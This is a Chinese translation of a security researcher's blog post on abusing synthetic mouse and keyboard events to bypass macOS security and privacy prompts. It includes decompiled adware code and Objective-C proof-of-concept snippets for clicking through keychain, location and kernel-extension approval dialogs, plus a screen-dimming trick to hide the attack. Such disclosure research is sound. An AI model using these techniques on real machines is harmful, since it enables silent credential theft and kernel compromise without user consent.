# 合成的现实：轻松一点突破macOS防护

阅读量 **170220**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2018-08-31 11:30:05

 **x**

##### 译文声明

本文是翻译文章，文章来源：objective-see.com

原文地址：<https://objective-see.com/blog/blog_0x36.html>

译文仅供参考，具体内容表达以及含义原文为准。

## 一、前言

假如我们是成功获得Mac访问权限的一名黑客（或者恶意软件），我们可能会执行如下操作：

1、转储用户keychain信息；

2、确定当前系统的（地理）位置；

3、枚举用户联系人信息；

4、加载内核扩展（kext）；

5、绕过第三方安全产品。

（对我们攻击者而言）不幸的是，较新版的macOS上有些安全机制会阻止这些操作。现在执行这些操作时，这些安全机制将弹出警告信息。根据macOS的设计，只有用户才能与这些警告交互，如下所示：

![](https://p2.ssl.qhimg.com/t0187f5f6fdb1e64790.png)

![](https://p2.ssl.qhimg.com/t0109855841f500e867.png)

然而如果我们能找到一种办法，采用编程方式或者“synthetic（合成的）”方式与这些警告窗口交互，我们就可以一举绕过这些安全机制。也就是说，如果这种攻击行之有效，那么UI就会成为唯一的突破口。本文将深入分析macOS上各类“合成”事件的各方面内容，从滥用这些功能的恶意软件到现在仍未修复的0day攻击。

> 注意：本文覆盖了我最近在DefCon上的演讲：“The Mouse is Mightier than the
> Sword”，同时包含了一些新的技术细节，请访问[此链接](https://speakerdeck.com/patrickwardle/the-> mouse-is-mightier-than-the-sword)获取完整的演讲材料。

## 二、Synthetic攻击简史

采用“合成的”或者编程的方式与UI交互并不是一个创新的想法，我们可以先来看下滥用这种事件的某些恶意软件。

> 注意：本节中描述的攻击方法已不适用于较新版本的macOS，然而下文我们将介绍一些0day方法，可以适用于最新版的Apple操作系统。

`OSX.FruitFly`编写于十多年前，但直到2017年初才引起人们注意。我之前写过介绍这款恶意软件的一份长篇白皮书（[“Offensive
Malware Analysis: Dissecting OSX.FruitFly.B via a Custom C&C
Server”](https://www.virusbulletin.com/uploads/pdf/magazine/2017/VB2017-Wardle.pdf)），其中提到了该恶意软件具备生成“synthetic（合成的）”鼠标及键盘事件的功能：

![](https://p5.ssl.qhimg.com/t019455d12e85d88c02.png)

下面这张动图演示了远程攻击者如何通过`OSX.FruitFly`远程绕过（keychain）安全访问提示窗口：

![](https://p2.ssl.qhimg.com/t016cc448310d9e8d3a.gif)

诞生于2011年的另一款Mac恶意软件（[OSX.DevilRobber](https://nakedsecurity.sophos.com/2011/10/29/devilrobber-mac-os-x-trojan-horse-spies-on-you-uses-gpu-for-bitcoin-mining/)）同样利用了这种“合成的”事件：

@noarfromspace曾提到过，这款恶意软件会导出用户keychain信息，通过几个简单的`AppleScript`命令绕过“keychain
access”提示窗口：

![](https://p4.ssl.qhimg.com/t01d36562cae5973180.png)

广告软件（adware）也会利用这种“合成的”事件。比如`OSX.Genieo`会把自己安装为浏览器扩展。然而通过代码安装（Safari）浏览器扩展的过程中会有个安全提示窗口阻止这种操作，为了完成这个任务，`OSX.Genieo`必须绕过这个提示窗口。这款广告软件如何实现这一点？只需发送一个“合成的”鼠标事件来点击“Allow”按钮即可！

更具体一点，如果我们（利用[jtool](http://www.newosxbook.com/tools/jtool.html)工具）导出`OSX.Genieo`的方法，可以看到名为`SafariExtensionInstaller`的一个类：

    
    
    $ jtool -d objc -v Installer.app/Contents/MacOS/AppAS
    
    @interface SafariExtensionInstaller : ?
    ...
    /* 2 - 0x1000376e1 */ + getPopupPosition;
    ...
    /* 4 - 0x100037c53 */ + clickOnInstallButton;
    /* 5 - 0x100037d71 */ + clickOnAllowButtonKeychain;
    ....
    /* 8 - 0x100038450 */ + clickOnTrustButton;
    

来看一下`clickOnInstallButton`的具体行为：

    
    
    char +[SafariExtensionInstaller clickOnInstallButton]{
    
     (@selector(getPopupPosition))(&var_40);
    
     r14 = CGEventCreateMouseEvent(0x0, 0x5, 0x0, rcx);
     r15 = CGEventCreateMouseEvent(0x0, 0x1, 0x0, rcx);                  
     rbx = CGEventCreateMouseEvent(0x0, 0x2, 0x0, rcx);
    
     CGEventPost(0x0, r14);
     CGEventPost(0x0, r15);
     CGEventPost(0x0, rbx);
    

首先代码调用`getPopupPosition`方法获取弹出窗口的位置，然后通过`CGEventCreateMouseEvent`以及`CGEventPost`
API发送一些“合成”的鼠标事件。`0x5`对应的是鼠标移动事件，`0x1`和`0x2`分别对应左键按下及松开事件。最终恶意软件可以通过这种方式解除警报，将自己安装为恶意浏览器扩展。

## 三、防御Synthetic事件

在最近版本的macOS上，Apple部署了各种防御措施来阻止这类“合成”攻击。然而这些防御措施并不通用，只能保护特定的UI组件（例如某些安全性或者访问提示窗口）。

在High
Sierra系统上（可能包括较老版本的macOS），如果有人尝试通过代码将鼠标事件发送至访问keychain之类的提示窗口时，操作系统会检测到这种行为并加以阻止：

    
    
    $ log show
    tccd  PID[44854] is checking access for target PID[44855]
    tccd Service kTCCServiceAccessibility does not allow prompting; returning preflight_unknown
    
    execution error: System Events got an error: osascript is not allowed assistive access. (-1719)
    

更具体一些，macOS会检查进程在生成“合成”事件时是否已通过辅助访问（assistive
access）检测（是的你没猜错，辅助访问提示窗口也能防御这种攻击方式）：

![](https://p4.ssl.qhimg.com/t01d3e57b2f96a77071.png)

“辅助访问”权限只能通过手动方式赋予特定的应用，我们可以通过`System
Preferences`（系统偏好设置）应用程序，查看已获取该权限的应用，也可以转储`/Library/Application
Support/com.apple.TCC/TCC.db`系统隐私数据库（受SIP保护）来获取这些信息：

![](https://p4.ssl.qhimg.com/t01d3b86f6c9a3a027e.png)

如下系统日志输出给出的信息，现在通过`CoreGraphics`生成的“合成”事件会被过滤及阻止（但同样只适用于被保护的目标UI组件）：

    
    
    default 08:52:57.441538 -1000 tccd  PID[209] is checking access for target PID[25349]
    error   08:52:57.657628 -1000 WindowServer Sender is prohibited from synthesizing events
    

如果我们grep查找`Sender is prohibited from synthesizing
events`，可以在某个核心库的`post_filtered_event_tap_data`函数中找到这个字符串：

    
    
    int post_filtered_event_tap_data(int arg0, int arg1, int arg2, ...)
    
        if (CGXSenderCanSynthesizeEvents() == 0x0) &&
           (os_log_type_enabled(*_default_log, 0x10) != 0x0)) {
              rbx = *_default_log;
              _os_log_error_impl(..., "Sender is prohibited from synthesizing events",...);
        }
    
    
    int CGXSenderCanSynthesizeEvents() {
       ...   
    
       rax = sandbox_check_by_audit_token("hid-control", 0x0, rdx, rdx);
    

在如上反编译代码中我们可以看到，如果`CGXSenderCanSynthesizeEvents`函数返回`0`（`false`或者`NO`）则会记录这个错误消息。如果`sandbox_check_by_audit_token`方法调用失败就会出现这种情况。

如函数名所示，`sandbox_check_by_audit_token`函数会检查发送“合成”事件的进程是否具备`hid-control`权限。这个检查过程似乎会在内核中执行，位于`mpo_iokit_check_hid_control_t`函数内部：

![](https://p1.ssl.qhimg.com/t012ee4f82e3dd0f9d3.png)

## 四、绕过Apple防护措施

现在我们可以戴上黑客帽子（也有可能是白帽子或者灰帽子），讨论某些漏洞以及0day！

我的目标很简单：在打全补丁的High
Sierra系统中通过“合成的”方式与任何/所有UI提示框（如安全、隐私及访问等）交互，像普通用户那样转储keychain或者加载内核扩展！

探索一番后，我发现了名为“Mouse Keys”的一个功能。

“Mouse
Keys”是macOS系统中有[文档说明](https://support.apple.com/kb/ph25642?locale=en_US)的一个功能，根据Apple的说法，该功能可以允许我们把键盘当成鼠标来使用！启用Mouse
Keys功能后，如果想将鼠标移动到右侧，我们只需要按下`O`（或者数字键`6`）即可。如果想生成鼠标点击事件，只需按下`I`（或者数字键`5`即可）：

![](https://p4.ssl.qhimg.com/t01b0af2b8203216cea.png)

这就会引出一些问题：

1、能否通过编程方式启动“Mouse Keys”功能？

2、“合成的”键盘事件能否生成可信的“合成的”鼠标事件？

这两个问题的答案都是肯定的！

首先，我们可以使用`AppleScript`在代码中打开`System Preferences`应用面板，面板上有个启用”Mouse
Keys“功能的复选框，然后使用`CoreGraphics`来发送”合成的“鼠标事件，启用该功能：

    
    
    //enable 'mouse keys'
    void enableMK(float X, float Y){

    
        //apple script
        NSAppleScript* scriptObject =
         [[NSAppleScript alloc] initWithSource:
            @"tell application "System Preferences"n" 
            "activaten" 
            "reveal anchor "Mouse" of pane id "com.apple.preference.universalaccess"n" 
            "end tell"];
    
        //exec
        [scriptObject executeAndReturnError:nil];
    
        //let it finish
        sleep(1);
    
        //clicky clicky
        CGPostMouseEvent(CGPointMake(X, Y), true, 1, true);
        CGPostMouseEvent(CGPointMake(X, Y), true, 1, false);
    
        return;
    }
    

由于Apple只会保护某些UI组件（比如安全性警告组件）免受”合成“事件的干扰，而这些UI组件并没有受到保护，因此我们操作起来一切顺利：

![](https://p5.ssl.qhimg.com/t0170c769264b87d68c.gif)

在启用”Mouse
Keys“功能时，为了生成鼠标点击事件，我们首先需要移动鼠标，然后通过`AppleScript`来发送”合成的“键盘事件。更具体一些，我们合成的是`87`这个键码（keycode）：

    
    
    //click via mouse key
    void clickAllow(float X, float Y)
    {
       //move mouse
       CGEventPost(kCGHIDEventTap, CGEventCreateMouseEvent(nil, kCGEventMouseMoved,
                   CGPointMake(X, Y), kCGMouseButtonLeft));
    
       //apple script
       NSAppleScript* script = [[NSAppleScript alloc] initWithSource:
                                @"tell application "System Events" to key code 87n"];
    
       //exec
       [script executeAndReturnError:nil];
    }
    

在启用”Mouse
Keys“时，当我们”按下“`87`键码（对应的是数字键`5`）时（即使通过代码方式也可以），系统就会将其转换为一次鼠标点击！大家可以使用我开源的[SniffMK](https://github.com/objective-see/sniffMK)鼠标键盘嗅探工具来观察这个现象：

    
    
    # ./sniffMK
    
    event: key down
    keycode: 0x57/87/5
    
    event: key up
    keycode: 0x57/87/5
    
    event: left mouse down
    (x: 146.207031, y: 49.777344)
    
    event: left mouse up
    (x: 146.207031, y: 49.777344)
    

由于操作系统会把键盘事件转化为鼠标事件，然后”传递“鼠标事件（点击），这样即便受保护的UI组件也会接受并处理这个事件！（一般来说，如果事件来源为操作系统时，这种受保护的组件会信任这些”合成的“事件）。

那么这个功能可以发挥什么作用？非常有用……比如可以转储或者提取用户keychain中所有私钥及未加密的密码，如[这个视频](https://vimeo.com/235313957)所示。

我已经将这个漏洞反馈给Apple，Apple在High Sierra的增量更新中将其标记为CVE-2017-7150加以修复：

![](https://p2.ssl.qhimg.com/t0141642355e512913c.png)

但”合成“的幽灵依然阴魂不散！

首先，我注意到各种隐私相关的警告窗口会盲目地接受这种改造后的鼠标事件（即使是在打全补丁的macOS
10.13.*环境中）。比如，在最近版本的macOS上，当代码尝试访问如下数据时，系统会显示警告窗口：

    
    
    系统（以及用户）的地理位置
    用户的联系人信息
    用户的日程事件
    其他数据
    

由于这些警告窗口会接受”合成的“事件，恶意软件可以在代码中简单绕过限制：

    
    
    //given some point {x, y}
    // generate synthetic event...
    CGPostMouseEvent(point, true, 1, true);
    CGPostMouseEvent(point, true, 1, false);
    

![](https://p3.ssl.qhimg.com/t01e00b71fbb6fce0c6.png)

如下PoC动图展示了如何通过攻击方式绕过系统警告窗口，确定用户的地理位置：

![](https://p1.ssl.qhimg.com/t0143fd43dd913bbe7a.gif)

大家可能会好奇：”既然恶意软件可以轻松绕过，为什么Apple还坚持弹出警告窗口“？我不知道具体原因，可能他们可以给出自己的解释。

现在还有另一个更加严重的问题。这个问题会导致无特权的恶意软件或者攻击者与”受保护的“UI组件（如High Sierra的”User Assisted
Kernel Loading“（用户辅助内核加载）接口）交互，并且这种方法也适用于打全补丁的macOS 10.6.*系统，非常糟糕。

发现这个问题源自于一次尴尬的意外，当时我想测试Apple对CVE-2017-7150的修复情况，但错误剪切并粘贴了一些代码，结果意外得到了一个0day！

前面提到过我们可以通过`CoreGraphics`方式发送”合成的“鼠标事件，正常情况下，对于这类鼠标点击方式，我们需要发送两个事件：鼠标按下事件，然后是鼠标松开事件：

    
    
    //given some point {x, y}
    // generate synthetic event...
    
    //final param: true => mouse down
    CGPostMouseEvent(point, true, 1, true);
    
    //final param: false => mouse up
    CGPostMouseEvent(point, true, 1, false);
    

然而，如果有人拷贝并粘贴了第一行代码`CGPostMouseEvent(point, true, 1,
true);`，并且忘记把最后一个参数从`true`修改为`false`（表示鼠标松开），这样就会生成两次鼠标按下事件。

理论上说这么做会被系统忽略掉，然而事实并非如此。通过`SniffMK`工具，我们可以观察到系统会将第二个（无效的）鼠标按下动作转化为鼠标松开动作：

    
    
    # ./sniffMK
    
    event: left mouse down
    event source pid 951
    event state 0 (synthetic)
    (x: 1100.000000, y: 511.000000)
    
    event: left mouse up
    event source pid 0
    event state 0 (synthetic)
    (x: 1100.000000, y: 511.000000)
    

第二个鼠标按下事件变成鼠标松开事件并不是什么大问题，问题在于这个动作由操作系统来执行，这意味着事件的`source process
id`（源进程ID）为`0`（即OS/system）。我们提到过，UI（包括安全提示窗口以及其他受保护的组件）会接受来自系统（pid为`0`）的”合成的“事件。比如，如果发送一个典型的鼠标按下/松开事件到”User
Assisted Kernel Loading“接口的”Allow“按钮时，这些事件会被忽略掉，产生如下错误信息：

    
    
    $ log stream | grep mouse
    Dropping mouse down event because sender's PID (899) isn't 0 or self (828)
    

然而如果pid为`0`呢？事实上这种操作就会被允许：

![](https://p0.ssl.qhimg.com/t01809454f798047c0a.png)

非常好，现在我们已经可以通过编程方式允许加载内核扩展，即使是在打全补丁的High Sierra系统上也毫无压力。

在OSX/macOS上，用户总是需要以root身份才能加载这种扩展。因此这种攻击方法能给我们带来什么效果？或者换个说法，”User Assisted
Kernel Loading“的意义何在？

在最近版本的macOS上，我们不仅需要以root身份来加载kext，同时kext还需要带有合法签名，而想从Apple那获取内核的代码签名证书几乎是不可能完成的任务。

然而攻击者还可以执行如下操作（我在2016年DefCon[演讲](https://speakerdeck.com/patrickwardle/defcon-2016-i-got-99-problems-but-little-snitch-aint-one)上也提到过)：

1、加载存在已知漏洞的第三方驱动（带有合法签名）；

2、利用已知漏洞来内核上下文中的任意代码执行权限。

Apple对这种攻击方式给出的解决方案是”User Assisted Kernel
Loading“，该接口要求用户必须手动批准任意kext的加载动作，但我们刚刚才看到这种”安全“机制曾出现过问题（CVE-2017-7150），并且仍然被我们无情地打破。那么谁是受害者？那就是与攻击者不是一类人的第三方开发者，他们只能遵循Apple制定的游戏规则来玩
🙁

![](https://p5.ssl.qhimg.com/t014f3b44df15b6ea8c.png)

## 五、隐身性分析

使用”合成“事件的这类攻击技术有一个明显的缺点，那就是攻击过程被用户一览无遗。

想象一下，当用户安坐在办公桌的Mac主机前，突然有个警告出现，而鼠标竟然会自动移动，然后点击解除警告窗口，傻子都知道自己被攻击了！

（对攻击者和恶意软件来说）幸运的是，解决办法也非常简单，只需要调暗屏幕即可：

![](https://p3.ssl.qhimg.com/t01779cbb4de8688c23.png)

当屏幕亮度变为`0.0`时，UI仍然”存在“并且处于活动状态（相对比屏幕被锁定或者屏保程序运行时）。然而，这些界面对用户来说似乎处于”关闭“状态，因此任何”合成“攻击都会隐藏在用户眼皮底下。

现在（作为攻击者）我们需要确保找到合适的机会调暗屏幕，比如：

1、用户一定时间没有操作时（使用`CGEventSourceSecondsSinceLastEventType` API获取这个信息）；

2、当屏幕即将休眠时。

在第二种情况下，代码可以检测显示器什么时候会进入休眠（通过`kIOMessageCanDevicePowerOff`通知）。此时程序可以将屏幕亮度快速调节为`0.0`，然后在屏幕休眠前快速执行各种”合成“攻击：

![](https://p3.ssl.qhimg.com/t0195416394ff1d38e6.png)

## 六、总结

通过使用”合成的“事件，恶意软件或者本地攻击者可以绕过macOS内置的各种安全机制：

![](https://p3.ssl.qhimg.com/t013e0d0e159dbc42fd.png)

虽然Apple已经知道这种攻击向量，也尝试过保护系统中与安全和隐私有关的UI组件，但攻击者还是简单地打破了这个屏障。即使在打全补丁的High
Sierra系统上，这种”合成式“交互操作还是非常容易，可以于无形之中绕过这类UI组件。

（对我们Mac用户而言）好消息在于在macOS
Mojave（10.14）上，这类”合成的“事件会在全局上被系统忽略掉（除非用户显式赋予某个应用这种权限）。虽然这种方法会影响各种合法的应用，但从安全角度来看，这又是正确的方法，所以我们就尽情享受这一点吧！

本文翻译自objective-see.com [原文链接](https://objective-see.com/blog/blog_0x36.html)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **興趣使然的小胃** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/158336](/post/id/158336)

安全客 - 有思想的安全新媒体

本文转载自: [objective-see.com](https://objective-see.com/blog/blog_0x36.html)

如若转载,请注明出处： <https://objective-see.com/blog/blog_0x36.html>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [macOS](/tag/macOS)
  * [synthetic attack](/tag/synthetic attack)

 **+1** __1赞

 __收藏

![](https://p4.ssl.qhmsg.com/dm/200_200_100/t0104d1b8b4ca36e961.jpg) 興趣使然的小胃

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

